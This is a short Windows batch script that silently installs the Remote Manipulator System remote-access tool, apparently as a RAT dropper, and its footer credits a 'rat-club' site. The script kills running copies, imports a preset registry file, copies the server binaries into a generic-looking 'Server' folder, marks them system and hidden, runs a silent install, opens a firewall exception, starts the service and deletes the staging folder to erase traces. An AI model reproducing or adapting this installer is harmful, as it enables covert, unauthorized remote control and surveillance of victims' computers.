@echo off

taskkill /f /im rutserv.exe
taskkill /f /im rfusclient.exe

reg delete "HKLM\SYSTEM\Remote Manipulator System" /f

md "C:\Program Files\Server"

cd C:\Hex

regedit /s "regedit.reg"

timeout 1

set aaaaaa=C:\Program Files\Server

timeout 2

copy "rfusclient.exe" "%aaaaaa%" >nul
copy "rutserv.exe" "%aaaaaa%" >nul
copy "vp8decoder.dll" "%aaaaaa%" >nul
copy "vp8encoder.dll" "%aaaaaa%" >nul

attrib +s +h "%aaaaaa%\*.*"

cd %aaaaaa%

rutserv.exe /silentinstall
rutserv.exe /firewall
rutserv.exe /start

timeout 3

del /f /q "C:\Hex"

@exit

:: coded by MasterPlus (rat-club.su)